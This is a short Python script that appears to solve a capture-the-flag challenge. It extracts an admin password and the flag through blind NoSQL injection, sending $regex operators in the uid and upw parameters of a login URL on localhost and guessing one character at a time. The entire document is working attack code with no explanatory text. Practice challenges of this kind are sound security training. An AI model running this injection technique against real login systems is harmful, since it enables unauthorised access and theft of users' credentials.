import requests, string

host = "http://127.0.0.1:80"
str_set = string.digits + string.ascii_letters
success = 'admin'

flag=''
for i in range(32):
    for ch in str_set:
        response = requests.get(f'{host}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}')
        if response.text == success:
            flag += ch
            break
    print(f"Flag: DH{{{flag}}}")
